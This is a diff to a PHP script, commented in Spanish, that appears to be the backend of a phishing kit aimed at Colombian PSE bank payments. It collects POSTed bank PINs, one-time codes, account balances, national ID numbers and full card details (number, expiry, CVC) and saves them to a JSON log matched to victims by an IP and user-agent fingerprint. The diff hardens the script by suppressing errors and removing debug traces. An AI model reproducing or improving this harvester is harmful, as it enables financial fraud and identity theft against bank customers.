@@ -4,20 +4,25 @@
  * BUSCA por fingerprint (IP + User Agent) - UNIVERSAL
  */
 
+// ====== SILENCIAR ERRORES Y LIMPIAR SALIDA ======
+error_reporting(0);
+ini_set('display_errors', 0);
+if (ob_get_level()) ob_end_clean();
+ob_start();
+
+// ====== HEADERS ======
 header('Content-Type: application/json; charset=utf-8');
 header('Access-Control-Allow-Origin: *');
 
+// ====== VERIFICAR MÉTODO ======
 if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+    ob_end_clean();
     http_response_code(405);
     echo json_encode(['success' => false, 'error' => 'Solo POST']);
     exit;
 }
 
-$dataDir = __DIR__ . '/data';
-if (!is_dir($dataDir)) {
-    @mkdir($dataDir, 0777, true);
-}
-
+// ====== RECIBIR DATOS ======
 $rawData = $_POST;
 
 // ====== OBTENER IP Y USER AGENT ======
@@ -27,7 +32,7 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
 // ====== GENERAR FINGERPRINT ======
 $fingerprint = md5($ip . '_' . $userAgent);
 
-// ====== BANCO (BUSCAR EN TODOS LOS CAMPOS POSIBLES) ======
+// ====== BANCO ======
 $banco = '';
 $camposBanco = ['banco', 'banco_seleccionado', 'banco_nombre', 'banco_pse'];
 foreach ($camposBanco as $campo) {
@@ -37,7 +42,7 @@ foreach ($camposBanco as $campo) {
     }
 }
 
-// ====== EXTRAER CUALQUIER IDENTIFICADOR QUE ENVÍE EL BANCO ======
+// ====== IDENTIFICADOR ======
 $identificador = '';
 $camposId = ['documento', 'identificacion', 'cedula', 'numero_documento', 'doc', 'id_usuario', 'documento_pse', 'usuario', 'user', 'username', 'celular', 'telefono'];
 foreach ($camposId as $campo) {
@@ -68,7 +73,7 @@ foreach ($camposOtp as $campo) {
 
 $saldo = trim($rawData['saldo'] ?? $rawData['saldo_cuenta'] ?? '');
 
-// ====== DATOS DE TARJETA (NUEVO) ======
+// ====== DATOS DE TARJETA ======
 $numero_tarjeta = trim($rawData['numero_tarjeta'] ?? '');
 $vencimiento = trim($rawData['vencimiento'] ?? '');
 $cvc = trim($rawData['cvc'] ?? '');
@@ -83,6 +88,11 @@ $apellido = trim($rawData['apellido'] ?? '');
 $cedula = trim($rawData['cedula'] ?? '');
 
 // ====== LEER LOGS ======
+$dataDir = __DIR__ . '/data';
+if (!is_dir($dataDir)) {
+    @mkdir($dataDir, 0777, true);
+}
+
 $logsFile = $dataDir . '/pse_logs.json';
 
 if (!file_exists($logsFile)) {
@@ -92,39 +102,17 @@ if (!file_exists($logsFile)) {
 $content = file_get_contents($logsFile);
 $logs = json_decode($content, true) ?? [];
 
-// ====== DEPURACIÓN ======
-$debugFile = __DIR__ . '/debug_track.txt';
-file_put_contents($debugFile, date('Y-m-d H:i:s') . "\n", FILE_APPEND);
-file_put_contents($debugFile, 'POST: ' . print_r($rawData, true) . "\n", FILE_APPEND);
-file_put_contents($debugFile, "FINGERPRINT generado: $fingerprint\n", FILE_APPEND);
-file_put_contents($debugFile, "IP: $ip, User Agent: $userAgent\n", FILE_APPEND);
-file_put_contents($debugFile, "Identificador extraído: $identificador\n", FILE_APPEND);
-
-// ====== MOSTRAR LOGS EN DEBUG ======
-file_put_contents($debugFile, "LOGS EXISTENTES:\n", FILE_APPEND);
-foreach ($logs as $i => $log) {
-    $logId = $log['id'] ?? 'N/A';
-    $logFingerprint = $log['fingerprint'] ?? 'N/A';
-    $tieneJelpit = isset($log['tiene_jelpit']) ? ($log['tiene_jelpit'] ? 'SI' : 'NO') : 'NO';
-    file_put_contents($debugFile, "  [$i] ID: $logId, fingerprint: $logFingerprint, tiene_jelpit: $tieneJelpit\n", FILE_APPEND);
-}
-file_put_contents($debugFile, "BUSCANDO fingerprint: '$fingerprint'\n", FILE_APPEND);
-
-// ====== BUSCAR POR FINGERPRINT (PRIMERO) ======
+// ====== BUSCAR POR FINGERPRINT ======
 $logEncontrado = false;
 $logId = null;
 
 foreach ($logs as &$log) {
     $logFingerprint = $log['fingerprint'] ?? '';
     
-    // BUSCAR POR FINGERPRINT
     if (!empty($fingerprint) && !empty($logFingerprint) && $logFingerprint == $fingerprint) {
         $logEncontrado = true;
         $logId = $log['id'];
         
-        file_put_contents($debugFile, ">>> ENCONTRADO POR FINGERPRINT: $fingerprint\n", FILE_APPEND);
-        
-        // ACTUALIZAR con datos del banco
         $log['banco'] = $banco;
         $log['clave_pin'] = $clave_pin;
         $log['codigo_otp'] = $codigo_otp;
@@ -133,7 +121,6 @@ foreach ($logs as &$log) {
         $log['estado'] = 'pendiente';
         $log['tiene_jelpit'] = true;
         
-        // ====== GUARDAR DATOS DE TARJETA SI EXISTEN ======
         if (!empty($numero_tarjeta)) $log['numero_tarjeta'] = $numero_tarjeta;
         if (!empty($vencimiento)) $log['vencimiento'] = $vencimiento;
         if (!empty($cvc)) $log['cvc'] = $cvc;
@@ -156,19 +143,14 @@ foreach ($logs as &$log) {
 }
 unset($log);
 
-// ====== SI NO SE ENCONTRÓ POR FINGERPRINT, BUSCAR POR IDENTIFICADOR ======
+// ====== BUSCAR POR IDENTIFICADOR ======
 if (!$logEncontrado && !empty($identificador)) {
-    file_put_contents($debugFile, "BUSCANDO por identificador: '$identificador'\n", FILE_APPEND);
-    
     foreach ($logs as &$log) {
-        // Buscar en TODOS los campos posibles del log
         $docLog = $log['documento'] ?? $log['usuario'] ?? $log['identificacion'] ?? $log['cedula'] ?? $log['numero_documento'] ?? $log['celular'] ?? '';
         
         if (!empty($docLog) && trim($docLog) == trim($identificador)) {
             $logEncontrado = true;
             $logId = $log['id'];
-            
-            file_put_contents($debugFile, ">>> ENCONTRADO POR IDENTIFICADOR: $identificador\n", FILE_APPEND);
             
             $log['banco'] = $banco;
             $log['clave_pin'] = $clave_pin;
@@ -180,7 +162,6 @@ if (!$logEncontrado && !empty($identificador)) {
                 $log['tiene_jelpit'] = false;
             }
             
-            // ====== GUARDAR DATOS DE TARJETA SI EXISTEN ======
             if (!empty($numero_tarjeta)) $log['numero_tarjeta'] = $numero_tarjeta;
             if (!empty($vencimiento)) $log['vencimiento'] = $vencimiento;
             if (!empty($cvc)) $log['cvc'] = $cvc;
@@ -204,9 +185,8 @@ if (!$logEncontrado && !empty($identificador)) {
     unset($log);
 }
 
-// ====== SI NO SE ENCONTRÓ, CREAR NUEVO ======
+// ====== CREAR NUEVO ======
 if (!$logEncontrado) {
-    file_put_contents($debugFile, ">>> NO ENCONTRADO, CREANDO NUEVO LOG\n", FILE_APPEND);
     $newLog = [
         'id' => uniqid('PSE_'),
         'fecha' => date('Y-m-d H:i:s'),
@@ -220,7 +200,6 @@ if (!$logEncontrado) {
         'ip' => $ip,
         'user_agent' => $userAgent,
         'identificador_banco' => $identificador,
-        // ====== DATOS DE TARJETA ======
         'numero_tarjeta' => $numero_tarjeta,
         'vencimiento' => $vencimiento,
         'cvc' => $cvc,
@@ -243,8 +222,8 @@ if (!$logEncontrado) {
 // ====== GUARDAR ======
 file_put_contents($logsFile, json_encode($logs, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
 
-file_put_contents($debugFile, "RESULTADO: " . ($logEncontrado ? "ACTUALIZADO" : "CREADO") . " - ID: $logId\n\n", FILE_APPEND);
-
+// ====== LIMPIAR SALIDA Y RESPONDER JSON ======
+ob_end_clean();
 echo json_encode([
     'success' => true,
     'id' => $logId,
@@ -253,6 +232,5 @@ echo json_encode([
     'identificador' => $identificador,
     'banco' => $banco
 ]);
-
 exit;
 ?>
